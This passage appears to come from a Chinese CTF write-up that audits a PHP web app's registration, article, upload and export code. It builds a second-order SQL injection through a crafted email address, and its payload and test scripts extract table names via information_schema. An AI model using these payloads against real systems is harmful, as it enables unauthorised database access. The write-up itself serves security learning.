+<p>发现可以不被限制<br>我们再看后半部分,<br>(实际上可以不看了，因为前面可以引入<code>#</code>,可以直接注释后面的内容)<br>将其拆分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line">    (\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])</span><br><span class="line">    |</span><br><span class="line">    (([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这里就比较中规中矩了<br>我们简单使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>即可<br>这里我们测试一下刚才的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos; and 1=1#&apos;&quot;@skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$email = &apos;&quot;\&apos; and 1=1#\&apos;&quot;@skysec.top&apos;;</span><br><span class="line">if(!preg_match(&apos;/^(([^&lt;&gt;()[\]\\.,;:\s@\&quot;]+(\.[^&lt;&gt;()[\]\\.,;:\s@\&quot;]+)*)|([\&quot;].+[\&quot;]))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/i&apos;,$email))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;fuck&apos;;</span><br><span class="line">&#125;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现成功bypass<br>再回到代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$email=daddslashes($email);</span><br></pre></td></tr></table></figure></p>
+<p>我们跟进一下daddslashes()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">        $keys = array_keys($string);</span><br><span class="line">        <span class="keyword">foreach</span> ($keys <span class="keyword">as</span> $key) &#123;</span><br><span class="line">            $val = $string[$key];</span><br><span class="line">            <span class="keyword">unset</span>($string[$key]);</span><br><span class="line">            $string[addslashes($key)] = daddslashes($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $string =addslashes(trim($string));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现这里梦想破灭，”都会被转义<br>我们测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">daddslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($string)) &#123;</span><br><span class="line">        $keys = array_keys($string);</span><br><span class="line">        <span class="keyword">foreach</span> ($keys <span class="keyword">as</span> $key) &#123;</span><br><span class="line">            $val = $string[$key];</span><br><span class="line">            <span class="keyword">unset</span>($string[$key]);</span><br><span class="line">            $string[addslashes($key)] = daddslashes($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $string =addslashes(trim($string));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$email = <span class="string">'"\' and 1=1#\'"@skysec.top'</span>;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/i'</span>,$email))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'fuck'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $email.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> daddslashes($email);</span><br></pre></td></tr></table></figure></p>
+<p>发现打印结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos; and 1=1#&apos;&quot;@skysec.top</span><br><span class="line">\&quot;\&apos; and 1=1#\&apos;\&quot;@skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>好吧，注册这里的直接注入也行不通了，我们先把这个放一放</p>
+<h2 id="add-view"><a href="#add-view" class="headerlink" title="add/view"></a>add/view</h2><p>直接看代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'title'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'content'</span>])&amp;&amp;$_POST[<span class="string">'content'</span>]&amp;&amp;$_POST[<span class="string">'title'</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string($_POST[<span class="string">'title'</span>]) &amp;&amp; is_string($_POST[<span class="string">'content'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user-&gt;add($_POST[<span class="string">'title'</span>],$_POST[<span class="string">'content'</span>]))&#123;</span><br><span class="line">                    header(<span class="string">"Location:/index.php/view/"</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//TODO！report it！</span></span><br><span class="line">                quit(<span class="string">'Add failed!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">"templates/add.html"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现过滤很少，同样跟进这里的add()方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($title,$content)</span></span>&#123;</span><br><span class="line">        $title=daddslashes($title);</span><br><span class="line">        $content=daddslashes($title);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;Insert(<span class="string">"articles"</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;id,<span class="string">"'$title'"</span>,<span class="string">"'$content'"</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里也基本不存在注入的可能了，全部转义了<br>然后是view函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'article'</span>]))&#123;</span><br><span class="line">    $id=intval($_GET[<span class="string">'article'</span>]);</span><br></pre></td></tr></table></figure></p>
+<p>看到这里我就知道凉了，这里直接给我们<code>intval()</code>了<br>此路不通，换！</p>
+<h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><p>直接看代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'nickname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>($_POST[<span class="string">'code'</span>]!==$_SESSION[<span class="string">'code'</span>])&#123;</span><br><span class="line">                quit(<span class="string">'validatecode error!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!$_POST[<span class="string">'nickname'</span>] <span class="keyword">or</span> !$_POST[<span class="string">'email'</span>]) quit(<span class="string">'Something error!'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($_POST[<span class="string">'nickname'</span>]!=<span class="keyword">$this</span>-&gt;user-&gt;getnickname())</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user-&gt;edit(<span class="string">"nickname"</span>,$_POST[<span class="string">'nickname'</span>]))</span><br><span class="line">                    $_SESSION[<span class="string">'user'</span>][<span class="number">2</span>]=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($_POST[<span class="string">'email'</span>]!=<span class="keyword">$this</span>-&gt;user-&gt;getemail())</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;user-&gt;edit(<span class="string">"email"</span>,$_POST[<span class="string">'email'</span>]))</span><br><span class="line">                    $_SESSION[<span class="string">'user'</span>][<span class="number">4</span>]=$_POST[<span class="string">'email'</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($_FILES[<span class="string">'avatar'</span>] <span class="keyword">and</span> $_FILES[<span class="string">"avatar"</span>][<span class="string">"error"</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>((($_FILES[<span class="string">"avatar"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) <span class="keyword">or</span> ($_FILES[<span class="string">"avatar"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>) <span class="keyword">or</span> ($_FILES[<span class="string">"avatar"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>)) <span class="keyword">and</span> $_FILES[<span class="string">'avatar'</span>][<span class="string">'size'</span>]&lt;<span class="number">65535</span>)&#123;</span><br><span class="line">                    $info=getimagesize($_FILES[<span class="string">'avatar'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(@is_array($info) <span class="keyword">and</span> array_key_exists(<span class="string">'mime'</span>,$info))&#123;</span><br><span class="line">                        $type=explode(<span class="string">'/'</span>,$info[<span class="string">'mime'</span>])[<span class="number">1</span>];</span><br><span class="line">                        $filename=<span class="string">"uploads/"</span>.<span class="keyword">$this</span>-&gt;user-&gt;getuser().<span class="string">"."</span>.$type;</span><br><span class="line">                        <span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'avatar'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">                            <span class="keyword">$this</span>-&gt;user-&gt;edit(<span class="string">"avatar"</span>,<span class="keyword">array</span>($filename,$type));</span><br><span class="line">                            <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'avatar'</span>][<span class="string">'tmp_name'</span>], $filename))&#123;</span><br><span class="line">                                quit_and_refresh(<span class="string">'Upload success!'</span>,<span class="string">'edit'</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            quit_and_refresh(<span class="string">'Success!'</span>,<span class="string">'edit'</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//TODO！report it！</span></span><br><span class="line">                        quit(<span class="string">'Only allow gif/jpeg/png files smaller than 64kb!'</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">//TODO！report it！</span></span><br><span class="line">                    quit(<span class="string">'Only allow gif/jpeg/png files smaller than 64kb!'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            quit(<span class="string">'Success!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">"templates/edit.html"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里主要是一个上传功能，我们看看是否可以Bypass<br>首先是类型检测<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((($_FILES[<span class="string">"avatar"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>) <span class="keyword">or</span> ($_FILES[<span class="string">"avatar"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>) <span class="keyword">or</span> ($_FILES[<span class="string">"avatar"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br></pre></td></tr></table></figure></p>
+<p>这里我们用burp改包就可以轻松bypass<br>接下来的操作就比较窒息了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$info=getimagesize($_FILES[<span class="string">'avatar'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span>(@is_array($info) <span class="keyword">and</span> array_key_exists(<span class="string">'mime'</span>,$info))&#123;</span><br><span class="line">    $type=explode(<span class="string">'/'</span>,$info[<span class="string">'mime'</span>])[<span class="number">1</span>];</span><br><span class="line">    $filename=<span class="string">"uploads/"</span>.<span class="keyword">$this</span>-&gt;user-&gt;getuser().<span class="string">"."</span>.$type;</span><br></pre></td></tr></table></figure></p>
+<p>文件后缀直接是mine的类型，这样我们基本失去bypass上传恶意文件的可能了<br>那么getuser()文件名会不会有问题呢？<br>我们跟一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;islogin) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    	<span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以说很绝望了，文件名也不可控，是我们注册的用户名，记得前面的分析，用户名是无法bypass的，更别说目录穿越了<br>所以这里的上传，除了文件名长度，我们基本上无法破解，只能也暂且放放了</p>
+<h2 id="export"><a href="#export" class="headerlink" title="export"></a>export</h2><p>导出功能代码无用的地方比较多，我就给出关键信息<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file_exists($avatar) <span class="keyword">and</span> filesize($avatar)&lt;<span class="number">65535</span>)&#123;</span><br><span class="line">                $data=file_get_contents($avatar);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;user-&gt;updateavatar($data)) quit(<span class="string">'Something error!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//TODO！report it！</span></span><br><span class="line">                $out=<span class="string">"Your avatar is invalid, so we reported it"</span>.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">                $report=<span class="keyword">$this</span>-&gt;user-&gt;getreport();</span><br><span class="line">                <span class="keyword">if</span>($report)&#123;</span><br><span class="line">                    $out.=<span class="string">"Your last report used email "</span>.htmlspecialchars($report[<span class="number">2</span>],ENT_QUOTES).<span class="string">", and report type is "</span>.$report[<span class="number">3</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">"templates/error.html"</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;user-&gt;report(<span class="number">1</span>)) quit(<span class="string">'Something error!'</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们关注到else这里<br>其中有一个可疑函数report()<br>我们跟一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">report</span><span class="params">($type_id)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;Insert(<span class="string">"reports"</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;id,<span class="string">"'$this-&gt;email'"</span>,$type_id));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里作者把它当做错误触发，所以未做任何过滤，其中有一点十分显眼，即email的插入</p>
+<h2 id="攻击点思考"><a href="#攻击点思考" class="headerlink" title="攻击点思考"></a>攻击点思考</h2><p>有意思的地方来了<br>这题注册的时候，我们可以Bypass注册恶意邮箱<br>但是其中有符号被转义了<br>有趣的是这个转义在取出数据库的时候会被去除<br>那么如果在取出后，系统又对这个数据进行了一次sql操作，是不是就可以触发注入了呢？<br>没错，正是二次注入<br>我们的注册的时候注册恶意邮箱<br>在这里触发错误报告的时候就会被系统再次调用，取出数据库后转义消失<br>拼接到insert语句时，构成sql注入攻击<br>我们根据这一点注册用户,邮箱为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;, 233), (2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#&quot;@skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>我们测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    $preg=<span class="string">"\\b(benchmark\\s*?\\(.*\\)|sleep\\s*?\\(.*\\)|load_file\\s*?\\()|UNION.+?SELECT\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)|UPDATE\\s*(\\(.+\\)\\s*|@&#123;1,2&#125;.+?\\s*|\\s+?.+?|(`|\'|\").*?(`|\'|\")\\s*)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)@&#123;0,2&#125;(\\(.+\\)|\\s+?.+?\\s+?|(`|\'|\").*?(`|\'|\"))FROM(\\&#123;.+\\&#125;|\\(.+\\)|\\s+?.+?|(`|\'|\").*?(`|\'|\"))|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/"</span>.$preg.<span class="string">"/is"</span>,$string))&#123;</span><br><span class="line">        var_dump(<span class="string">'hacker'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_string($email) <span class="keyword">or</span> !$email <span class="keyword">or</span> !filter($email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(([^&lt;&gt;()[\]\\.,;:\s@\"]+(\.[^&lt;&gt;()[\]\\.,;:\s@\"]+)*)|([\"].+[\"]))@((\[[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]&#123;2,&#125;))$/i'</span>,$email)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">$email = <span class="string">'"\', 233), (2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#"@skysec.top'</span>;    </span><br><span class="line">var_dump(register($email));</span><br></pre></td></tr></table></figure></p>
+<p>结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool(true)</span><br></pre></td></tr></table></figure></p>
+<p>发现可以注册成功<br>此时我们数据库中的email存储格式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;\&apos;, 233), (2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#\&quot;@skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>没错，都是转义过的<br>这个时候假设我们能触发export中的else选项<br>则意味着触发<code>$this-&gt;user-&gt;report(1)</code>功能<br>即<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;Insert(<span class="string">"reports"</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;id,<span class="string">"'$this-&gt;email'"</span>,<span class="number">1</span>));</span><br></pre></td></tr></table></figure></p>
+<p>此时<code>$this-&gt;email</code>为我们邮箱取出数据库的值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;, 233), (2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#&quot;@skysec.top</span><br></pre></td></tr></table></figure></p>
+<p>我们将email带进去<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;db-&gt;Insert(&quot;reports&quot;,array($this-&gt;id,&apos;&quot;&apos;, 233), (2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#&quot;@skysec.top&apos;,1));</span><br></pre></td></tr></table></figure></p>
+<p>根据注释<br>我们此时利用report插入了两条数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;id,&apos;&quot;&apos;, 233</span><br><span class="line">2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)#&quot;@skysec.top&apos;,1</span><br></pre></td></tr></table></figure></p>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;id,&apos;&quot;&apos;, 233</span><br><span class="line">2333, (SELECT group_concat(TABLE_NAME) FROM/**/ information_schema.TABLES where TABLE_SCHEMA=database()), 23333)</span><br></pre></td></tr></table></figure></p>
+<p>so nice!<br>我们成功触发了sql注入<br>但是我们需要解决的问题有2个：<br>1.自己的id我们需要知道，这样可以插入<br>2.触发<code>if(file_exists($avatar) and filesize($avatar)&lt;65535)</code>false，这样就会成功来到else，构成系列攻击</p>
+<h3 id="解决问题1-id"><a href="#解决问题1-id" class="headerlink" title="解决问题1-id"></a>解决问题1-id</h3><p>先解决自己id的问题<br>我们发现view功能里有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'article'</span>]))&#123;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $id=<span class="keyword">$this</span>-&gt;user-&gt;getid();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;view=<span class="keyword">$this</span>-&gt;user-&gt;getarticle();</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">"templates/view.html"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，如果我们不输入article参数<br>那么系统就会调用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getid</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;islogin) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们即可获得自己的id</p>
+<h3 id="解决问题2-if-false"><a href="#解决问题2-if-false" class="headerlink" title="解决问题2-if_false"></a>解决问题2-if_false</h3><p>然后是第二个问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(file_exists($avatar) <span class="keyword">and</span> filesize($avatar)&lt;<span class="number">65535</span>)</span><br></pre></td></tr></table></figure></p>
+<p>如何让上面这段代码false<br>我们跟踪<code>$avatar</code>变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$avatar=<span class="keyword">$this</span>-&gt;user-&gt;getavatar();</span><br></pre></td></tr></table></figure></p>
